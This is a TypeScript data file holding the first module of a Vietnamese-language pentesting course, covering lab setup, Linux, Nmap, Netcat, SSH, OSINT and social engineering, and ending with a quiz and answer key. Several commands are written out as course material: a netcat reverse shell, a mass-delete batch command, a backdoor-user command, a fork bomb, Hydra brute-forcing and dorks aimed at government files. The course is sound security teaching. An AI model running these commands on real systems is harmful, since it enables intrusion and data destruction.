import { Module } from '../../types';

export const MODULE_1: Module = {
  id: 'foundation',
  title: 'Giai đoạn 1: Nền tảng & Lab (Buổi 1-20)',
  sessions: [
    {
      id: 'day-1',
      day: 1,
      category: 'Lab',
      title: 'Thiết lập môi trường Lab ảo an toàn',
      description: 'Cài đặt VirtualBox và cấu hình mạng cô lập để thực hành mã độc.',
      content: `Lý thuyết:
Trong an toàn thông tin, việc thực hành trên máy thật là điều tối kỵ. Một sai lầm nhỏ có thể dẫn đến việc mất dữ liệu hoặc bị hacker chiếm quyền điều khiển máy thật.
Chúng ta sử dụng Hypervisor (VirtualBox/VMware) để tạo ra các máy ảo (VM). Các máy này chạy hoàn toàn tách biệt với hệ điều hành chủ (Host OS).

Các loại mạng trong VirtualBox:
1. NAT: VM có internet nhưng Host không thấy VM.
2. Bridged: VM như một máy thật trong mạng LAN nhà bạn (Không an toàn khi nghịch mã độc).
3. Host-only: VM chỉ liên lạc được với Host và các VM khác. Không có internet (An toàn nhất).
4. Internal Network: Các VM chỉ thấy nhau, Host không thấy VM.`,
      exercises: [
        {
          title: 'Xây dựng pháo đài ảo',
          description: 'Thiết lập mạng Internal Network cho Lab.',
          steps: [
            'Tải và cài đặt VirtualBox bản mới nhất.',
            'Vào File -> Tools -> Network Manager để kiểm tra các card mạng ảo.',
            'Tạo một máy ảo mới (chưa cần cài OS) và vào phần Network, chọn Attached to: Internal Network.',
            'Đặt tên mạng là "CyberLab_Internal".'
          ]
        }
      ]
    },
    {
      id: 'day-2',
      day: 2,
      category: 'Practice',
      title: 'Cài đặt & Tối ưu Kali Linux',
      description: 'Cài đặt hệ điều hành tấn công và làm quen với giao diện.',
      content: `Lý thuyết:
Kali Linux dựa trên Debian, được duy trì bởi Offensive Security. Nó không phải là hệ điều hành để dùng hàng ngày (như xem phim, lướt web) mà là một bộ công cụ.

Tối ưu hóa sau khi cài đặt:
- Cập nhật kho phần mềm.
- Cài đặt Guest Additions để dùng full màn hình và copy-paste giữa máy thật/máy ảo.
- Cấu hình người dùng (Sử dụng sudo thay vì root trực tiếp).`,
      commands: [
        { name: 'Update System', description: 'Cập nhật toàn bộ hệ thống', usage: 'sudo apt update && sudo apt full-upgrade -y' },
        { name: 'Install Tools', description: 'Cài đặt các công cụ bổ trợ', usage: 'sudo apt install build-essential dkms linux-headers-$(uname -r)' }
      ],
      exercises: [
        {
          title: 'Làm chủ Kali',
          description: 'Cấu hình môi trường làm việc chuyên nghiệp.',
          steps: [
            'Cài đặt Kali Linux từ file ISO (chọn dung lượng RAM ít nhất 2GB).',
            'Thực hiện lệnh cập nhật hệ thống.',
            'Tạo một snapshot trong VirtualBox ngay sau khi cài xong để có thể quay lại nếu làm hỏng hệ thống.'
          ]
        }
      ]
    },
    {
      id: 'day-3',
      day: 3,
      category: 'Theory',
      title: 'Linux File System & Permissions',
      description: 'Hiểu cách Linux quản lý file và quyền truy cập.',
      content: `Lý thuyết:
Trong Linux, "Everything is a file". 
Cấu trúc thư mục quan trọng:
- /etc: Chứa các file cấu hình hệ thống.
- /bin & /usr/bin: Chứa các lệnh thực thi.
- /home: Thư mục cá nhân của người dùng.
- /root: Thư mục của quản trị viên.
- /tmp: Thư mục tạm (thường bị xóa khi khởi động lại).

Quyền truy cập (Permissions):
Gồm 3 nhóm: Owner (u), Group (g), Others (o).
Gồm 3 loại quyền: Read (4), Write (2), Execute (1).
Ví dụ: chmod 755 có nghĩa là:
- Owner: 4+2+1 = 7 (rwx)
- Group: 4+1 = 5 (r-x)
- Others: 4+1 = 5 (r-x)`,
      commands: [
        { name: 'ls -l', description: 'Xem quyền của file', usage: 'ls -l /etc/passwd' },
        { name: 'chmod', description: 'Thay đổi quyền', usage: 'chmod 400 my_secret_key.txt' },
        { name: 'chown', description: 'Thay đổi chủ sở hữu', usage: 'sudo chown root:root file.txt' }
      ],
      exercises: [
        {
          title: 'Quản lý đặc quyền',
          description: 'Thực hành phân quyền file an toàn.',
          steps: [
            'Tạo một thư mục mới và một file bên trong.',
            'Thử tước bỏ quyền đọc của chính mình và xem kết quả khi dùng lệnh cat.',
            'Sử dụng sudo để đọc file mà bạn không có quyền.'
          ]
        }
      ]
    },
    {
      id: 'day-4',
      day: 4,
      category: 'Practice',
      title: 'Bash Scripting cho Pentester',
      description: 'Tự động hóa các tác vụ lặp đi lặp lại.',
      content: `Lý thuyết:
Bash script là một file văn bản chứa các lệnh Linux được thực thi tuần tự.
Cấu trúc cơ bản:
#!/bin/bash
# Đây là comment
variable="Hello"
echo $variable

Vòng lặp (Loops) và Điều kiện (If-else) là hai thành phần quan trọng nhất để viết các công cụ quét mạng đơn giản.`,
      commands: [
        { name: 'Run script', description: 'Thực thi script', usage: 'chmod +x script.sh && ./script.sh' }
      ],
      exercises: [
        {
          title: 'Viết công cụ quét IP',
          description: 'Tạo một script đơn giản để kiểm tra các máy đang online trong mạng.',
          steps: [
            'Tạo file pinger.sh.',
            'Sử dụng vòng lặp for từ 1 đến 254.',
            'Dùng lệnh ping -c 1 để kiểm tra từng IP.',
            'In ra màn hình những IP nào phản hồi.'
          ]
        }
      ]
    },
    {
      id: 'day-5',
      day: 5,
      category: 'Lab',
      title: 'Thiết lập máy nạn nhân Windows 10',
      description: 'Cấu hình máy mục tiêu để thực hành tấn công.',
      content: `Lý thuyết:
Để học tấn công, chúng ta cần một mục tiêu. Windows 10 là mục tiêu phổ biến nhất.
Tuy nhiên, Windows hiện đại có rất nhiều lớp bảo mật (Defender, Firewall, UAC).
Trong giai đoạn đầu, chúng ta sẽ học cách tấn công các máy có cấu hình yếu hoặc bị tắt bảo mật để hiểu nguyên lý.`,
      exercises: [
        {
          title: 'Làm yếu mục tiêu',
          description: 'Cấu hình Windows 10 cho việc học tập.',
          steps: [
            'Cài đặt Windows 10 vào máy ảo mới.',
            'Tắt Windows Real-time Protection.',
            'Tắt Windows Firewall.',
            'Đặt mật khẩu đơn giản cho user (ví dụ: 123456) để thực hành brute-force sau này.'
          ]
        }
      ]
    },
    {
      id: 'day-6',
      day: 6,
      category: 'Theory',
      title: 'Mô hình OSI & Giao thức TCP/IP',
      description: 'Nền tảng mạng cho an ninh mạng.',
      content: `Lý thuyết:
Bạn không thể hack cái gì mà bạn không hiểu cách nó kết nối.
Mô hình OSI 7 lớp:
1. Physical (Cáp, sóng)
2. Data Link (MAC address, Switch)
3. Network (IP address, Router)
4. Transport (TCP/UDP, Ports)
5. Session
6. Presentation
7. Application (HTTP, FTP, DNS)

TCP vs UDP:
- TCP: Có bắt tay 3 bước (SYN, SYN-ACK, ACK), tin cậy.
- UDP: Không bắt tay, nhanh, không đảm bảo dữ liệu đến đích.`,
      commands: [
        { name: 'netstat', description: 'Xem các cổng đang mở', usage: 'netstat -tuln' },
        { name: 'ip addr', description: 'Xem địa chỉ IP', usage: 'ip addr show' }
      ],
      exercises: [
        {
          title: 'Phân tích kết nối',
          description: 'Quan sát các cổng dịch vụ đang chạy.',
          steps: [
            'Dùng lệnh netstat trên cả Kali và Windows.',
            'Xác định xem cổng 80 (HTTP) hoặc 443 (HTTPS) có đang mở không.',
            'Thử dùng lệnh telnet để kết nối vào một cổng bất kỳ.'
          ]
        }
      ]
    },
    {
      id: 'day-7',
      day: 7,
      category: 'Practice',
      title: 'Sử dụng Wireshark cơ bản',
      description: 'Lắng nghe và phân tích gói tin trên mạng.',
      content: `Lý thuyết:
Wireshark là công cụ phân tích giao thức mạng hàng đầu thế giới. Nó cho phép bạn thấy "từng bit" dữ liệu đang chạy trên dây cáp.
Khái niệm quan trọng: Promiscuous Mode (Chế độ hỗn tạp) cho phép card mạng đọc tất cả gói tin nó thấy, kể cả không gửi cho nó.`,
      exercises: [
        {
          title: 'Bắt gói tin HTTP',
          description: 'Xem dữ liệu truyền đi không mã hóa.',
          steps: [
            'Mở Wireshark trên Kali, chọn card mạng tương ứng.',
            'Trên máy Windows, truy cập một trang web dùng HTTP (không có S).',
            'Sử dụng filter "http" trong Wireshark.',
            'Tìm gói tin GET và xem nội dung HTML bên trong.'
          ]
        }
      ]
    },
    {
      id: 'day-8',
      day: 8,
      category: 'Theory',
      title: 'Các loại mã độc phổ biến (Malware Types)',
      description: 'Phân biệt Virus, Worm, Trojan, Ransomware.',
      content: `Lý thuyết:
1. Virus: Cần file thực thi để lây lan (cần người dùng click).
2. Worm: Tự nhân bản và lây lan qua mạng (không cần người dùng).
3. Trojan: Giả dạng phần mềm hữu ích nhưng chứa mã độc bên trong.
4. Ransomware: Mã hóa dữ liệu và đòi tiền chuộc.
5. Spyware: Theo dõi người dùng (Keylogger, Camera).
6. Rootkit: Ẩn mình sâu trong nhân hệ điều hành (Kernel).`,
      exercises: [
        {
          title: 'Phân tích hành vi giả định',
          description: 'Lập bảng so sánh các loại mã độc.',
          steps: [
            'Tìm hiểu về mã độc WannaCry (nó là Worm hay Ransomware?).',
            'Viết ra 3 dấu hiệu nhận biết máy tính bị nhiễm Spyware.',
            'Giải thích tại sao Rootkit là loại khó phát hiện nhất.'
          ]
        }
      ]
    },
    {
      id: 'day-9',
      day: 9,
      category: 'Practice',
      title: 'Tạo Virus giả lập (Batch Script)',
      description: 'Hiểu cách script tự động thực thi lệnh nguy hiểm.',
      content: `Lý thuyết:
File .bat trên Windows có thể thực thi các lệnh CMD một cách tự động. Hacker thường dùng nó để tắt tường lửa, xóa file hoặc tạo user mới.
Ví dụ lệnh nguy hiểm:
del /f /s /q C:\\*.txt (Xóa sạch file txt)
net user hacker 123456 /add (Tạo user mới)`,
      commands: [
        { name: 'Create file', description: 'Tạo file bat', usage: 'echo "echo Hello" > test.bat' }
      ],
      exercises: [
        {
          title: 'Zip Bomb & Fork Bomb',
          description: 'Tạo script gây treo máy (chỉ chạy trên máy ảo!).',
          steps: [
            'Tạo file bomb.bat với nội dung: %0|%0 (Đây là Fork Bomb).',
            'Chạy thử trên máy ảo Windows và quan sát Task Manager (CPU sẽ lên 100%).',
            'Giải thích cơ chế tự nhân bản của lệnh trên.'
          ]
        }
      ]
    },
    {
      id: 'day-10',
      day: 10,
      category: 'Lab',
      title: 'Kiểm tra lỗ hổng với Nmap (Phần 1)',
      description: 'Quét cổng và xác định hệ điều hành.',
      content: `Lý thuyết:
Nmap (Network Mapper) là công cụ "phải biết" của mọi Pentester.
Các kiểu quét:
- TCP Connect Scan (-sT): Hoàn tất bắt tay 3 bước (Dễ bị phát hiện).
- Stealth Scan (-sS): Chỉ gửi gói SYN (Khó bị ghi log hơn).
- Service Detection (-sV): Xác định phiên bản phần mềm đang chạy trên cổng đó.`,
      commands: [
        { name: 'Quick Scan', description: 'Quét nhanh các cổng phổ biến', usage: 'nmap 192.168.1.10' },
        { name: 'OS Detection', description: 'Xác định hệ điều hành', usage: 'sudo nmap -O 192.168.1.10' }
      ],
      exercises: [
        {
          title: 'Thám mã mạng Lab',
          description: 'Sử dụng Nmap từ Kali để quét máy Windows.',
          steps: [
            'Tìm IP của máy Windows.',
            'Thực hiện quét -sS để xem các cổng đang mở.',
            'Thử quét -sV để xem phiên bản Windows và các dịch vụ đang chạy.',
            'Ghi lại danh sách các cổng "Open" tìm được.'
          ]
        }
      ]
    },
    {
      id: 'day-11',
      day: 11,
      category: 'Practice',
      title: 'Nmap nâng cao (Scripts & Evasion)',
      description: 'Sử dụng Nmap Scripting Engine (NSE) và kỹ thuật vượt tường lửa.',
      content: `Lý thuyết:
Nmap không chỉ quét cổng, nó còn có thể tìm lỗ hổng nhờ NSE.
Các nhóm script quan trọng:
- auth: Kiểm tra xác thực.
- broadcast: Khám phá thiết bị qua broadcast.
- brute: Thử mật khẩu.
- default: Các script an toàn và hữu ích nhất.
- vuln: Tìm kiếm các lỗ hổng đã biết (CVE).

Kỹ thuật né tránh (Evasion):
- Fragment packets (-f): Chia nhỏ gói tin để lừa IDS.
- Decoy (-D): Giả mạo IP nguồn từ nhiều máy khác nhau.
- Timing (-T0 đến -T5): Điều chỉnh tốc độ quét để tránh bị phát hiện.`,
      commands: [
        { name: 'Vuln Scan', description: 'Quét lỗ hổng bảo mật', usage: 'nmap --script vuln 192.168.1.10' },
        { name: 'Decoy Scan', description: 'Quét giả mạo IP', usage: 'nmap -D RND:10 192.168.1.10' }
      ],
      exercises: [
        {
          title: 'Sử dụng NSE',
          description: 'Tìm kiếm lỗi bảo mật trên máy Windows.',
          steps: [
            'Sử dụng script smb-vuln-ms17-010 để kiểm tra lỗi EternalBlue.',
            'Thử quét với timing -T2 (Polite) và so sánh thời gian với -T4 (Aggressive).',
            'Giải thích tại sao quét chậm lại an toàn hơn cho Pentester.'
          ]
        }
      ]
    },
    {
      id: 'day-12',
      day: 12,
      category: 'Practice',
      title: 'Netcat - Con dao Thụy Sĩ của Hacker',
      description: 'Truyền file, quét cổng và tạo Reverse Shell.',
      content: `Lý thuyết:
Netcat (nc) là công cụ đọc và ghi dữ liệu qua kết nối mạng sử dụng TCP hoặc UDP.
Các tính năng chính:
1. Banner Grabbing: Xem thông tin dịch vụ.
2. File Transfer: Gửi file giữa hai máy.
3. Port Scanning: Quét cổng nhanh.
4. Bind Shell: Máy nạn nhân mở cổng, hacker kết nối vào.
5. Reverse Shell: Máy nạn nhân kết nối ngược về máy hacker (Vượt tường lửa tốt hơn).`,
      commands: [
        { name: 'Listen', description: 'Mở cổng lắng nghe', usage: 'nc -lvp 4444' },
        { name: 'Connect', description: 'Kết nối tới cổng', usage: 'nc 192.168.1.10 4444' },
        { name: 'Reverse Shell', description: 'Tạo shell ngược (Linux)', usage: 'nc -e /bin/bash 192.168.1.5 4444' }
      ],
      exercises: [
        {
          title: 'Truyền file bí mật',
          description: 'Sử dụng Netcat để gửi file giữa Kali và Windows.',
          steps: [
            'Trên Kali, dùng nc để lắng nghe và chuyển hướng output vào file.',
            'Trên Windows, dùng nc để gửi nội dung file sang IP của Kali.',
            'Kiểm tra xem file đã được nhận toàn vẹn chưa.'
          ]
        }
      ]
    },
    {
      id: 'day-13',
      day: 13,
      category: 'Theory',
      title: 'Mã hóa cơ bản (Cryptography 101)',
      description: 'Hashing, Mã hóa đối xứng và bất đối xứng.',
      content: `Lý thuyết:
An ninh mạng dựa trên toán học của mã hóa.
1. Hashing (Băm): Một chiều, không thể dịch ngược (MD5, SHA256). Dùng để kiểm tra tính toàn vẹn.
2. Symmetric Encryption (Đối xứng): Dùng chung 1 Key để mã hóa và giải mã (AES, DES). Nhanh nhưng khó quản lý Key.
3. Asymmetric Encryption (Bất đối xứng): Dùng cặp Public Key (để mã hóa) và Private Key (để giải mã) (RSA, ECC). An toàn hơn nhưng chậm.

Khái niệm "Salt": Thêm dữ liệu ngẫu nhiên vào mật khẩu trước khi băm để chống lại Rainbow Tables.`,
      commands: [
        { name: 'Hash string', description: 'Tạo mã băm SHA256', usage: 'echo -n "password" | sha256sum' }
      ],
      exercises: [
        {
          title: 'Bẻ khóa Hash đơn giản',
          description: 'Hiểu tại sao MD5 không còn an toàn.',
          steps: [
            'Tạo mã băm MD5 của một từ đơn giản.',
            'Sử dụng trang web "CrackStation" hoặc công cụ "hashcat" để tìm lại từ gốc.',
            'Thử làm tương tự với SHA512 và xem sự khác biệt.'
          ]
        }
      ]
    },
    {
      id: 'day-14',
      day: 14,
      category: 'Practice',
      title: 'Bảo mật SSH & Quản lý Remote Access',
      description: 'Cấu hình truy cập từ xa an toàn và kỹ thuật Brute-force.',
      content: `Lý thuyết:
SSH (Secure Shell) thay thế Telnet vì nó mã hóa toàn bộ dữ liệu truyền đi.
Các lỗ hổng thường gặp:
- Sử dụng mật khẩu yếu.
- Cho phép đăng nhập bằng root (PermitRootLogin yes).
- Không đổi cổng mặc định (22).

Kỹ thuật tấn công: Brute-force mật khẩu bằng công cụ Hydra.`,
      commands: [
        { name: 'SSH Connect', description: 'Kết nối SSH', usage: 'ssh user@192.168.1.10' },
        { name: 'Hydra SSH', description: 'Tấn công mật khẩu SSH', usage: 'hydra -l root -P passlist.txt ssh://192.168.1.10' }
      ],
      exercises: [
        {
          title: 'Gia cố SSH',
          description: 'Cấu hình SSH server trên Kali Linux.',
          steps: [
            'Sửa file /etc/ssh/sshd_config.',
            'Đổi cổng 22 sang một cổng khác (ví dụ: 2222).',
            'Tắt đăng nhập bằng mật khẩu, chỉ cho phép dùng SSH Key.',
            'Thử kết nối lại và kiểm tra tính bảo mật.'
          ]
        }
      ]
    },
    {
      id: 'day-15',
      day: 15,
      category: 'Theory',
      title: 'Web Fundamentals: HTTP, Cookies & Sessions',
      description: 'Cách trình duyệt và máy chủ giao tiếp.',
      content: `Lý thuyết:
Web Hacking bắt đầu từ việc hiểu giao thức HTTP.
- Request: Phương thức (GET, POST, PUT, DELETE), Headers, Body.
- Response: Status Code (200 OK, 404 Not Found, 500 Error), Headers, Body.

Quản lý trạng thái:
- Cookies: Dữ liệu nhỏ lưu ở trình duyệt.
- Sessions: Dữ liệu lưu ở máy chủ, định danh qua Session ID trong Cookie.
Nguy cơ: Nếu hacker đánh cắp được Session ID, họ có thể giả mạo bạn (Session Hijacking).`,
      exercises: [
        {
          title: 'Khám phá Header',
          description: 'Sử dụng phím F12 (Developer Tools) trong trình duyệt.',
          steps: [
            'Mở tab Network.',
            'Truy cập một trang web và xem các Request/Response Headers.',
            'Tìm kiếm Cookie "sessionid" hoặc tương tự.',
            'Giải thích ý nghĩa của Header "User-Agent".'
          ]
        }
      ]
    },
    {
      id: 'day-16',
      day: 16,
      category: 'Practice',
      title: 'Thu thập thông tin (OSINT)',
      description: 'Sử dụng nguồn tin công khai để tìm hiểu mục tiêu.',
      content: `Lý thuyết:
OSINT (Open Source Intelligence) là bước đầu tiên của mọi cuộc tấn công.
Các thông tin cần tìm:
- Tên miền, IP, DNS records.
- Email nhân viên, chức vụ.
- Công nghệ đang sử dụng (Wappalyzer).
- Các file tài liệu bị lộ (metadata).

Công cụ: whois, dig, nslookup, theHarvester.`,
      commands: [
        { name: 'Whois', description: 'Tra cứu thông tin tên miền', usage: 'whois hust.edu.vn' },
        { name: 'DNS Lookup', description: 'Tra cứu bản ghi DNS', usage: 'dig hust.edu.vn ANY' }
      ],
      exercises: [
        {
          title: 'Thám mã mục tiêu',
          description: 'Thu thập thông tin về một tổ chức (giả định).',
          steps: [
            'Sử dụng theHarvester để tìm email liên quan đến một domain.',
            'Sử dụng Wappalyzer (extension trình duyệt) để xem web đó dùng Server gì (Nginx/Apache).',
            'Tìm kiếm các file PDF của tổ chức đó và dùng công cụ "exiftool" để xem metadata (ai là người tạo file, dùng phần mềm gì).'
          ]
        }
      ]
    },
    {
      id: 'day-17',
      day: 17,
      category: 'Theory',
      title: 'Google Dorking & Shodan',
      description: 'Tìm kiếm lỗ hổng qua các công cụ tìm kiếm.',
      content: `Lý thuyết:
Google không chỉ để tìm tin tức, nó là một database khổng lồ về các file cấu hình bị lộ.
Các toán tử Google Dork:
- site: giới hạn tên miền.
- filetype: tìm loại file (pdf, sql, log).
- intitle: tìm từ khóa trong tiêu đề trang.
- inurl: tìm từ khóa trong đường dẫn.

Shodan: "Google của các thiết bị kết nối". Nó quét toàn bộ internet để tìm các thiết bị (Camera, Router, Industrial Control Systems) có lỗ hổng hoặc mật khẩu mặc định.`,
      exercises: [
        {
          title: 'Sử dụng Google Dorks',
          description: 'Tìm kiếm các file nhạy cảm bị lộ.',
          steps: [
            'Thử lệnh: site:gov.vn filetype:xls "danh sách"',
            'Thử lệnh: intitle:"index of" "parent directory"',
            'Lưu ý: Chỉ quan sát, không được truy cập trái phép vào các hệ thống tìm được.'
          ]
        }
      ]
    },
    {
      id: 'day-18',
      day: 18,
      category: 'Theory',
      title: 'Social Engineering: Thao túng tâm lý',
      description: 'Tại sao con người là mắt xích yếu nhất.',
      content: `Lý thuyết:
Social Engineering là nghệ thuật lừa đảo để lấy thông tin bí mật.
Các kỹ thuật phổ biến:
1. Phishing: Email giả mạo (Ngân hàng, Quà tặng).
2. Spear Phishing: Tấn công nhắm vào một cá nhân cụ thể.
3. Pretexting: Tạo ra một kịch bản giả (ví dụ: giả làm nhân viên IT).
4. Baiting: Để lại USB có chứa mã độc ở nơi công cộng.
5. Tailgating: Đi theo nhân viên vào khu vực hạn chế.`,
      exercises: [
        {
          title: 'Phân tích Email lừa đảo',
          description: 'Nhận diện các dấu hiệu nghi ngờ.',
          steps: [
            'Tìm một mẫu email phishing trên mạng.',
            'Chỉ ra 3 điểm bất thường (Địa chỉ người gửi, Lỗi chính tả, Link giả mạo).',
            'Giải thích tại sao cảm giác "cấp bách" (Urgency) lại được hacker sử dụng nhiều.'
          ]
        }
      ]
    },
    {
      id: 'day-19',
      day: 19,
      category: 'Practice',
      title: 'An toàn vật lý & USB Rubber Ducky',
      description: 'Tấn công qua cổng USB và các thiết bị phần cứng.',
      content: `Lý thuyết:
Nếu hacker có thể chạm vào máy tính của bạn, đó không còn là máy tính của bạn nữa.
USB Rubber Ducky: Một thiết bị trông giống USB nhưng máy tính nhận diện là Bàn phím. Nó có thể "gõ" hàng ngàn lệnh trong vài giây ngay khi cắm vào.
Nguyên lý: Máy tính luôn tin tưởng bàn phím.`,
      exercises: [
        {
          title: 'Mô phỏng tấn công USB',
          description: 'Hiểu về cơ chế "BadUSB".',
          steps: [
            'Tìm hiểu về ngôn ngữ "Ducky Script".',
            'Viết một đoạn script giả định để mở Notepad và gõ chữ "You have been hacked".',
            'Thảo luận cách phòng chống: Khóa máy khi rời đi, không cắm USB lạ.'
          ]
        }
      ]
    },
    {
      id: 'day-20',
      day: 20,
      category: 'Lab',
      title: 'Tổng kết Giai đoạn 1: Lab Assessment',
      description: 'Kiểm tra kỹ năng tổng hợp từ buổi 1 đến 19.',
      content: `Lý thuyết:
Chúc mừng bạn đã hoàn thành giai đoạn nền tảng!
Hôm nay là buổi thực hành tổng hợp. Bạn sẽ phải sử dụng tất cả các công cụ đã học (Linux, Nmap, Netcat, Bash) để giải quyết một tình huống thực tế trong Lab.`,
      exercises: [
        {
          title: 'Thử thách cuối khóa 1',
          description: 'Xâm nhập máy ảo mục tiêu.',
          steps: [
            'Quét mạng để tìm IP máy mục tiêu.',
            'Xác định các cổng đang mở và dịch vụ đang chạy.',
            'Tìm kiếm một file "flag.txt" được giấu đâu đó trên hệ thống (giả định qua một cổng mở).',
            'Sử dụng Netcat để lấy nội dung file đó về máy Kali.'
          ]
        }
      ],
      quizzes: [
        {
          question: "Lệnh nào trong Linux dùng để thay đổi quyền truy cập của một file?",
          options: [
            { id: 'A', text: 'chown', isCorrect: false },
            { id: 'B', text: 'chmod', isCorrect: true },
            { id: 'C', text: 'chgrp', isCorrect: false },
            { id: 'D', text: 'ls -l', isCorrect: false }
          ],
          explanation: "chmod (change mode) được sử dụng để thay đổi quyền đọc, ghi, và thực thi của file/thư mục."
        },
        {
          question: "Trong Nmap, cờ (flag) nào được sử dụng để quét ẩn danh (Stealth Scan)?",
          options: [
            { id: 'A', text: '-sT', isCorrect: false },
            { id: 'B', text: '-sV', isCorrect: false },
            { id: 'C', text: '-O', isCorrect: false },
            { id: 'D', text: '-sS', isCorrect: true }
          ],
          explanation: "-sS (TCP SYN scan) là kiểu quét phổ biến nhất, nó gửi gói SYN nhưng không hoàn thành quá trình bắt tay 3 bước, giúp khó bị phát hiện hơn."
        },
        {
          question: "Giao thức nào sau đây KHÔNG đảm bảo dữ liệu sẽ đến đích một cách toàn vẹn?",
          options: [
            { id: 'A', text: 'TCP', isCorrect: false },
            { id: 'B', text: 'HTTP', isCorrect: false },
            { id: 'C', text: 'UDP', isCorrect: true },
            { id: 'D', text: 'SSH', isCorrect: false }
          ],
          explanation: "UDP (User Datagram Protocol) là giao thức phi kết nối, nó gửi dữ liệu đi mà không cần kiểm tra xem bên nhận đã nhận được chưa."
        },
        {
          question: "Kỹ thuật tấn công nào liên quan đến việc lừa người dùng nhấp vào một đường link giả mạo qua email?",
          options: [
            { id: 'A', text: 'Phishing', isCorrect: true },
            { id: 'B', text: 'Baiting', isCorrect: false },
            { id: 'C', text: 'Tailgating', isCorrect: false },
            { id: 'D', text: 'Pretexting', isCorrect: false }
          ],
          explanation: "Phishing là hình thức lừa đảo phổ biến nhất qua email, giả mạo các tổ chức uy tín để đánh cắp thông tin."
        },
        {
          question: "Công cụ nào được mệnh danh là 'Con dao Thụy Sĩ' của Hacker, dùng để đọc/ghi dữ liệu qua mạng?",
          options: [
            { id: 'A', text: 'Nmap', isCorrect: false },
            { id: 'B', text: 'Wireshark', isCorrect: false },
            { id: 'C', text: 'Netcat', isCorrect: true },
            { id: 'D', text: 'Hydra', isCorrect: false }
          ],
          explanation: "Netcat (nc) là một công cụ cực kỳ linh hoạt, có thể dùng để quét cổng, truyền file, và tạo reverse/bind shell."
        }
      ]
    }
  ]
};
